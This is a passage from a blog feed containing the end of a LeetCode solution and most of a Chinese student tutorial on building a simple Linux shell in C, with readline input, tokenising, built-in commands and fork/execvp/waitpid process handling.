<p>则此时start = numsSize - 2，end = numsSize - 1</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span> <span class="built_in">end</span>+<span class="number">1</span>;</span><br></pre></td></tr></table></figure>

<p>则返回numsSize。</p>
</li>
</ol>
]]></content>
      <categories>
        <category>LeetCode题解</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>c语言</tag>
      </tags>
  </entry>
  <entry>
    <title>在Linux环境下用c实现简易shell程序</title>
    <url>/2020/01/22/%E5%9C%A8Linux%E7%8E%AF%E5%A2%83%E4%B8%8B%E7%94%A8c%E5%AE%9E%E7%8E%B0%E7%AE%80%E6%98%93shell%E7%A8%8B%E5%BA%8F/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>​        这学期学校开设了操作系统的课程，但是内容比较浅显基础，我认为操作系统作为程序员的基本功之一，比较重要，也就想自己多学点，就想用<strong>c语言</strong>写一个在<strong>linux操作系统</strong>上的<strong>shell</strong>，顺便复习一下大一学的c语言，也在用<strong>《c和指针》</strong>去复习，不得不说，这本书确实写的不错，当然，对初学者不是那么友好，有一定基础的人可以去看，很不错。</p>
<p>最后，这篇文章里的代码可以在<a href="https://gitee.com/BMooS/myshell" target="_blank" rel="noopener">这里</a> (gitee)或者<a href="https://github.com/BMooS/master" target="_blank" rel="noopener">这里</a> (github)看到。</p>
<p>顺便说一下，作者再写这个程序时候只是一个在读学生，有些错误和粗浅之处，欢迎大家指正，谢谢大家。</p>
<a id="more"></a>

<h1 id="如何实现shell-以及整体框架"><a href="#如何实现shell-以及整体框架" class="headerlink" title="如何实现shell 以及整体框架"></a>如何实现shell 以及整体框架</h1><p>​        首先让我们明白一个shell的<strong>生命周期</strong>，任何事物都有自己的生命周期，shell自然也不例外。</p>
<p>我们启动终端，终端就开始加载shell程序，</p>
<ul>
<li><p><strong>首先</strong> shell会有自己的初始化，即加载并执行配置文件，这些配置会改变shell的行为</p>
</li>
<li><p><strong>然后</strong> shell程序启动，不断从标准输入中读取内容，并试图理解和执行这些内容</p>
</li>
<li><p><strong>最后</strong> 当所有命令完成后，控制shell程序关闭，并自动清除内存，自然退出</p>
</li>
</ul>
<p>  <em>这样的程序描述自然过于简单，正常且普遍的shell的程序执行自然比这个复杂，但大体是这样的一个流程。</em></p>
<p>  接下来我们简易去实现这个框架</p>
  <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">//配置文件</span></span><br><span class="line">    <span class="comment">//循环运行执行程序</span></span><br><span class="line">    my_shell_loop();</span><br><span class="line">    <span class="comment">//shell程序退出</span></span><br><span class="line">    <span class="keyword">return</span> EXIT_SUCCESS</span><br><span class="line"> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>这里我们用循环去实现shell程序的主体部分，但shell程序不仅仅只有循环。</p>
<h1 id="具体细节"><a href="#具体细节" class="headerlink" title="具体细节"></a>具体细节</h1><h2 id="loop循环梗概"><a href="#loop循环梗概" class="headerlink" title="loop循环梗概"></a>loop循环梗概</h2><p>​        接下来让我们探讨loop循环的实现</p>
<p>​        shell程序在执行中不断<strong>读取</strong>标准输入中的内容，并加以<strong>分析执行</strong>，最后反馈给用户。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">loop</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *<span class="built_in">line</span>;</span><br><span class="line">    <span class="keyword">int</span> state = <span class="number">1</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">do</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"myshell -&gt; "</span>);</span><br><span class="line">        <span class="comment">//读取标准输入中的内容，保存在line里面</span></span><br><span class="line">        <span class="built_in">line</span> = shell_readline();</span><br><span class="line">        <span class="comment">//分析并加以执行</span></span><br><span class="line">        state = execute_line(<span class="built_in">line</span>);</span><br><span class="line">    &#125;<span class="keyword">while</span>(state);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="命令读入"><a href="#命令读入" class="headerlink" title="命令读入"></a>命令读入</h2><p>​        这里我们自己写入一个readline函数，具体分析程序是如何运作的。</p>
<p><strong>注意</strong> 这里我们引入了动态内存，因为我们不可能限制并给定用户的输入长度，用户输入的字符串长度是未知的，所以这里使用动态内存来储存字符串。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">shell_readline</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> bufsize = <span class="number">1024</span>; <span class="comment">//初始给定1024字符的长度</span></span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">char</span> *<span class="built_in">buffer</span> = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">char</span>)*bufsize);<span class="comment">//缓存区里开辟bufsize大小的内存</span></span><br><span class="line">    <span class="keyword">int</span> c;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!<span class="built_in">buffer</span>)&#123; <span class="comment">//检查返回值</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"allocation error\n"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        c = getchar();</span><br><span class="line">        <span class="keyword">if</span>(c == EOF || c == <span class="string">'\n'</span>)&#123;</span><br><span class="line">            <span class="built_in">buffer</span>[i] = <span class="string">'\0'</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">buffer</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="built_in">buffer</span>[i] = c;</span><br><span class="line">            i++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(i &gt;= bufsize)&#123; <span class="comment">//当现有字符串数量大于bufsize时，重新分配2倍大小的内存空间</span></span><br><span class="line">            bufsize += bufsize;</span><br><span class="line">            <span class="built_in">buffer</span> = <span class="built_in">realloc</span>(<span class="built_in">buffer</span>, <span class="keyword">sizeof</span>(<span class="keyword">char</span>)*bufsize);</span><br><span class="line">            <span class="keyword">if</span>(!<span class="built_in">buffer</span>)&#123; <span class="comment">//检查返回指针</span></span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"allocation error\n"</span>);</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>注意</strong> 在使用动态内存的时候一定要<strong>小心</strong>以下几点</p>
<ul>
<li>调用malloc函数和realloc函数的时候要检查返回值，因为当申请新内存而现有资源不够的时候，就会返回NULL, 这是一个“null pointer”（空指针）</li>
<li>当然调用realloc函数时候，传递参值的时候也要小心，不要传递一个NULL，也不要传递一个非动态内存返回的指针</li>
<li>最后，<strong>一定一定</strong>注意内存的回收，即调用free()函数，回收动态内存空间，free函数的参值也是一个动态内存返回的指针，如果不回收动态内存，编译器不会报错，但是会造成<strong>内存泄漏</strong>，这是要极力避免的事情</li>
</ul>
<p>这样就简易实现了一个readline函数，简单且实用，但是我们想要实现bash，zsh这些著名shell里，可以使用上下键调用历史命令，可以用tab键补全命令这些功能就有些无力了，好在我们有现成的轮子可以套用，那就是readline库。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;readline/history.h&gt;</span></span></span><br><span class="line"><span class="built_in">line</span> = readline(<span class="string">"Myshell -&gt; "</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">line</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"allocation error\n"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line">add_history(<span class="built_in">line</span>);</span><br><span class="line"><span class="built_in">free</span>(<span class="built_in">line</span>);</span><br></pre></td></tr></table></figure>

<p><strong>注意：</strong> </p>
<ul>
<li><p>readline库是一个<strong>动态连接库</strong>，gcc编译时候需要动态链接，使用一下指令即可： </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gcc main.c -lreadline</span><br></pre></td></tr></table></figure>
</li>
<li><p>readline函数返回值是一个指针，指向一个动态内存区域，也需要判别是否为NULL以及使用free函数释放掉，防止内存泄漏</p>
</li>
<li><p>作者在这里只是很粗浅的使用，只是用了add_history()函数用于添加历史指令，readline函数有更高阶的操作，具体在这里<a href="https://tiswww.case.edu/php/chet/readline/readline.html" target="_blank" rel="noopener">官方文档</a>(注：需要一点科学上网手段)</p>
</li>
</ul>
<p>  在这里，作者发现原始的颜色太单调，我们可以调制一些颜色对于shell提示输入符：</p>
  <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CLOSE <span class="meta-string">"\001\033[0m\002"</span>                 <span class="comment">// 关闭所有属性</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BLOD  <span class="meta-string">"\001\033[1m\002"</span>                 <span class="comment">// 强调、加粗、高亮</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BEGIN(x,y) <span class="meta-string">"\001\033["</span>#x<span class="meta-string">";"</span>#y<span class="meta-string">"m\002"</span>	<span class="comment">// x: 背景，y: 前景</span></span></span><br><span class="line"></span><br><span class="line"> <span class="built_in">line</span> = readline(BEGIN(<span class="number">49</span>, <span class="number">34</span>)<span class="string">"Myshell-&gt;  "</span>CLOSE);<span class="comment">//使用一点宏定义简化一些复杂性</span></span><br></pre></td></tr></table></figure>

<p>效果如下：</p>
<p><img src="https://i.loli.net/2019/12/15/78nbjUHFfsIBSQZ.png" alt="UTOOLS1576411800363.png"></p>
<p>这样就好看多了</p>
<h2 id="命令解析"><a href="#命令解析" class="headerlink" title="命令解析"></a>命令解析</h2><p>​        现在我们来构造<strong>execute_line()</strong>函数。</p>
<p>​         对于在shell里面输入一个命令，不仅有<strong>内部命令</strong>，即写入程序代码中的命令，和<strong>外部命令</strong>，即shell要fork一个新进程，进程去系统path中寻找可执行的程序去解析命令。还有对一个命令语句来说，有<strong>命令部分</strong>，还有<strong>参数部分</strong>，而我们要做的就是将一条命令语句中的参数和命令分开并处理。</p>
<p>​        即：</p>
<p>​                我们要在<strong>execute_line()</strong>构造<strong>cut_line()</strong>和<strong>execute()</strong>两个函数去实现。</p>
<h3 id="cut-line"><a href="#cut-line" class="headerlink" title="cut_line()"></a>cut_line()</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span> **<span class="title">cut_line</span><span class="params">(<span class="keyword">char</span> *<span class="built_in">line</span>)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> bufsize = <span class="number">64</span>, i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">char</span> **tokens = <span class="built_in">malloc</span>(bufsize*<span class="keyword">sizeof</span>(<span class="keyword">char</span>*));</span><br><span class="line">    <span class="keyword">char</span> *token;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!tokens)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"allocation error\n"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125; </span><br><span class="line">    token = strtok(<span class="built_in">line</span>, <span class="string">" "</span>);</span><br><span class="line">    <span class="keyword">while</span> (token != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        tokens[i] = token;</span><br><span class="line">        i++;</span><br><span class="line">        <span class="keyword">if</span>(i &gt;= bufsize)&#123;</span><br><span class="line">            bufsize += bufsize;</span><br><span class="line">            tokens = <span class="built_in">realloc</span>(tokens, bufsize*<span class="keyword">sizeof</span>(<span class="keyword">char</span>*));</span><br><span class="line">            <span class="keyword">if</span>(!tokens)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"allocation error\n"</span>);</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        token = strtok(<span class="literal">NULL</span>, <span class="string">" "</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    tokens[i] = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">return</span> tokens;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​        在这里我们先申请了一个字符指针的指针，大小为64个单位，用来保存一个字符串数组。</p>
<p>​        在cut_line()中我们用C 标准库<strong>&lt;string.h&gt;</strong>中<strong>strtok()</strong>函数：</p>
<blockquote>
<p>C 库函数</p>
<p><strong>char *strtok(char *str, const char *delim)</strong></p>
<p>分解字符串 <strong>str</strong> 为一组字符串，<strong>delim</strong> 为分隔符。</p>
<p>该函数返回被分解的第一个子字符串，如果没有可检索的字符串，则返回一个空指针。</p>
</blockquote>
<p><strong>实例</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span> <span class="params">()</span> </span>&#123;</span><br><span class="line">   <span class="keyword">char</span> str[<span class="number">80</span>] = <span class="string">"This is - BMooS - shell"</span>;</span><br><span class="line">   <span class="keyword">const</span> <span class="keyword">char</span> s[<span class="number">2</span>] = <span class="string">"-"</span>;</span><br><span class="line">   <span class="keyword">char</span> *token;</span><br><span class="line">   </span><br><span class="line">   <span class="comment">/* 获取第一个子字符串 */</span></span><br><span class="line">   token = strtok(str, s);</span><br><span class="line">   </span><br><span class="line">   <span class="comment">/* 继续获取其他的子字符串 */</span></span><br><span class="line">   <span class="keyword">while</span>( token != <span class="literal">NULL</span> ) &#123;</span><br><span class="line">      <span class="built_in">printf</span>( <span class="string">"%s\n"</span>, token );</span><br><span class="line">    </span><br><span class="line">      token = strtok(<span class="literal">NULL</span>, s);</span><br><span class="line">   &#125;</span><br><span class="line">   </span><br><span class="line">   <span class="keyword">return</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行结果：</p>
<blockquote>
<p>This is</p>
<p>BMooS</p>
<p>shell</p>
</blockquote>
<p><strong>注意：</strong></p>
<ol>
<li>还是和上述一样，在动态分配内存的的时候注意是否分配成功以及分配的多少，这里我采用的是几何倍数增长大小需求。</li>
<li>在生成字符串数组的时候，记住在末尾加入空指针<strong>NULL</strong>。</li>
<li>cut_line()函数返回的是一个指向动态内存空间的指针，主要在外部调用的时候配合free()函数使用。</li>
</ol>
<h3 id="execute"><a href="#execute" class="headerlink" title="execute()"></a>execute()</h3><p>​        execute()函数接受上面cut_line()函数的<strong>返回值</strong>，即execute()函数的参数是一个字符串数组，从变量类型上说，就是字符指针的指针。</p>
<p>​        这里我们在构造的时候要想到<strong>对命令的提取</strong>，<strong>对命令的识别</strong>以及<strong>对命令的执行</strong>。我们上述说到，对一个命令来说，我们识别它是一个内部命令还是一个外部命令，以便对命令<strong>区分执行</strong>。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">execute</span><span class="params">(<span class="keyword">char</span> **char_list)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">if</span>(char_list[<span class="number">0</span>] == <span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; long_cmd(); i++)&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">strcmp</span>(char_list[<span class="number">0</span>], cmder[i]) == <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> (*funcs[i])(char_list); </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">process</span>(char_list);<span class="comment">//调用进程</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>逻辑结构</strong></p>
<p>​        这里我们在构造execute()函数的时候我们对<strong>char_list[0]</strong>进行判空，不为空即有命令，我们要遍历我们在shell程序中编写的<strong>内部命令函数</strong>，看输入命令是否于其中内部命令匹配，若不匹配，则为外部命令，这时我们要调用我们编写的<strong>process()</strong>单独执行。</p>
<p><strong>内部命令</strong></p>
<p>​        我们这里需要构造一个字符串数组和一个自定义函数以及一个转换表：</p>
<ol>
<li>内部命令列表</li>
</ol>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">char</span> *cmder[] = &#123;</span><br><span class="line">    <span class="string">"cd"</span>,</span><br><span class="line">    <span class="string">"pwd"</span>,</span><br><span class="line">    <span class="string">"help"</span>,</span><br><span class="line">    <span class="string">"exit"</span>,</span><br><span class="line">    <span class="string">"echo"</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>返回内部命令列表长度的整型函数</li>
</ol>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">long_cmd</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">sizeof</span>(cmder)/<span class="keyword">sizeof</span>(<span class="keyword">char</span>*);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>转换表—函数指针数组</li>
</ol>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> (*funcs[])(<span class="keyword">char</span>**) = &#123;</span><br><span class="line">    &amp;fun_cd,</span><br><span class="line">    &amp;fun_pwd,</span><br><span class="line">    &amp;fun_help,</span><br><span class="line">    &amp;fun_exit,</span><br><span class="line">    &amp;fun_echo</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>​        <strong>内部命令是编写在shell程序里面的，是自定义的，我们对它们起名也是自定义的。</strong></p>
<p>​        <strong>注意：函数声明要在转换表之前</strong></p>
<p>现在让我们开始编写内部命令：</p>
<ol>
<li><strong>cd</strong>命令</li>
</ol>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fun_cd</span><span class="params">(<span class="keyword">char</span>** char_list)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(char_list[<span class="number">1</span>] == <span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Please enter the correct directory\n"</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(chdir(char_list[<span class="number">1</span>]) != <span class="number">0</span>)&#123;</span><br><span class="line">            perror(<span class="string">"myshell"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用系统函数<strong>chdir()</strong>改变当前工作目录  </p>
<p>函数说明：</p>
<ol>
<li>用户将当前的工作目录改变成以参数路径所指的目录。</li>
<li>使用头文件 unistd.h。</li>
<li>chdir()函数返回值执行成功则返回0，失败返回-1，errno为错误代码。</li>
</ol>
<ol start="2">
<li><strong>pwd</strong>命令</li>
</ol>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fun_pwd</span><span class="params">(<span class="keyword">char</span>** char_list)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> bufsize = <span class="number">1024</span>;</span><br><span class="line">    <span class="keyword">char</span> *<span class="built_in">buffer</span> = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">char</span>)*bufsize);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">buffer</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"allocation error1\n"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(getcwd(<span class="built_in">buffer</span>, bufsize) == <span class="literal">NULL</span>)&#123;</span><br><span class="line">            bufsize += bufsize;</span><br><span class="line">            <span class="built_in">buffer</span> = <span class="built_in">realloc</span>(<span class="built_in">buffer</span>, <span class="keyword">sizeof</span>(<span class="keyword">char</span>)*bufsize);</span><br><span class="line">            <span class="keyword">if</span> (!<span class="built_in">buffer</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"allocation error\n"</span>);</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"current working directory : %s\n"</span>, <span class="built_in">buffer</span>);</span><br><span class="line">            <span class="built_in">free</span>(<span class="built_in">buffer</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>函数使用getcwd()获得当前工作目录的绝对路径。</p>
<p>函数声明：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">getcwd</span><span class="params">(<span class="keyword">char</span> *buf,<span class="keyword">size_t</span> <span class="built_in">size</span>)</span></span>;</span><br></pre></td></tr></table></figure>



<p>函数说明：</p>
<ol>
<li>getcwd()会将当前工作目录的绝对路径复制到参数buf所指的内存空间中,参数size为buf的空间大小。</li>
<li>如果路径长度大于size,则会返回NULL。</li>
</ol>
<ol start="3">
<li><strong>help</strong>命令</li>
</ol>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fun_help</span><span class="params">(<span class="keyword">char</span>** char_list)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"---------------------myshell---------------------\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Type program names and arguments, and hit enter.\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"-----------The following are built in:-----------\n"</span>);</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; long_cmd(); i++)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%s\n"</span>, cmder[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Use the man command for information on other programs.\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"-------Support for simple pipes and redirects---------\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"------------------------------------------------------\n"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>shell程序里调用help命令获得内部命令集。</p>
<ol start="4">
<li><strong>exit</strong>命令</li>
</ol>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fun_exit</span><span class="params">(<span class="keyword">char</span>** char_list)</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"-----------------------goodbye-----------------------\n"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>exit命令返回值为0，可以中断loop循环，结束shell程序。</p>
<ol start="5">
<li><strong>echo</strong>命令</li>
</ol>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fun_echo</span><span class="params">(<span class="keyword">char</span>** char_list)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">if</span> (char_list[<span class="number">1</span>] == <span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Enter correct output.\n"</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">for</span> ( i = <span class="number">1</span>; char_list[i] != <span class="literal">NULL</span>; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"%s "</span>, char_list[i] );</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>echo命令用来输出后缀参数。</p>
<p><strong>注意：内部命令是自定义的，可扩充的。</strong></p>
<p><strong>外部命令</strong></p>
<p>​        这里我们要让原本shell程序执行的进程fork出两个进程，一个是<strong>父进程</strong>，一个为<strong>子进程</strong>。父进程是原本shell进程，阻塞并等待子进程执行结束。子进程用来执行外部命令。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">process</span><span class="params">(<span class="keyword">char</span>** char_list)</span></span>&#123;</span><br><span class="line">    <span class="keyword">pid_t</span> pid = fork(),wpid;</span><br><span class="line">    <span class="keyword">int</span> status;</span><br><span class="line">    <span class="keyword">if</span> (pid == <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span> (execvp(char_list[<span class="number">0</span>], char_list) == <span class="number">-1</span>)&#123;</span><br><span class="line">            perror(<span class="string">"myshell "</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">1</span>);<span class="comment">//子进程报错后销毁，返回父进程</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span> (pid &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        perror(<span class="string">"myshell "</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">do</span>&#123;</span><br><span class="line">            wpid = waitpid(pid, &amp;status, WUNTRACED);</span><br><span class="line">        &#125;<span class="keyword">while</span> (!WIFEXITED(status) &amp;&amp; !WIFSIGNALED(status));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面使用到了三个系统函数，fork()，execvp()，waitpid()</p>
<p>关于fork函数，我之前写过一篇博客用来介绍，详细可以看<a href="https://bmoos.github.io/2020/01/15/fork/">这里</a>。</p>
<p>关于execvp函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">execvp</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* file, <span class="keyword">const</span> <span class="keyword">char</span>* argv[])</span></span>;</span><br></pre></td></tr></table></figure>

<p> 第一个参数是要运行的文件，会在环境变量PATH中查找file并执行。</p>
<p> 第二个参数，是一个参数列表。</p>
<blockquote>
<p>execvp函数执行失败的时候，子进程是无法正常退出的，需要用exit强制退出该子进程，所以这时候就需要加个判断，当execvp执行失败返回-1时，调用exit()来退出子进程，不然该进程还是在那里，导致后边的shell程序无法正常执行。</p>
</blockquote>
<p>execvp()是exec函数族里面其中之一，关于exec函数族，我之后会在写一篇博客用来介绍。</p>
<p>关于waitpid函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">pid_t</span> waitpid(<span class="keyword">pid_t</span> pid,<span class="keyword">int</span> *status,<span class="keyword">int</span> options)</span><br></pre></td></tr></table></figure>



<p>在<a href="https://bmoos.github.io/2020/01/15/fork/">这里</a>有wait函数用法，从本质上讲，系统调用waitpid和wait的作用是完全相同的，<strong>但waitpid多出了两个可由用户控制的参数pid和options</strong>，从而为我们编程提供了另一种更灵活的方式。</p>
<blockquote>
<p>从参数的名字pid和类型pid_t中就可以看出，这里需要的是一个进程ID。但当pid取不同的值时，在这里有不同的意义。</p>
<ol>
<li>pid&gt;0时，只等待进程ID等于pid的子进程，不管其它已经有多少子进程运行结束退出了，只要指定的子进程还没有结束，waitpid就会一直等下去。</li>
<li>pid=-1时，等待任何一个子进程退出，没有任何限制，此时waitpid和wait的作用一模一样。</li>
<li>pid=0时，等待<strong>同一个进程组</strong>中的任何子进程，如果子进程已经加入了别的进程组，waitpid不会对它做任何理睬。</li>
<li>pid&lt;-1时，等待一个<strong>指定进程组</strong>中的任何子进程，这个进程组的ID等于pid的绝对值。</li>
</ol>
</blockquote>
<blockquote>
<p><strong>options</strong>提供了一些额外的选项来控制waitpid，目前在Linux中只支持<strong>WNOHANG</strong>和<strong>WUNTRACED</strong>两个选项，这是两个常数，可以用”|”运算符把它们连接起来使用 。</p>
</blockquote>
<p>​    在关于父进程等待的时候，要注意子进程状态。</p>
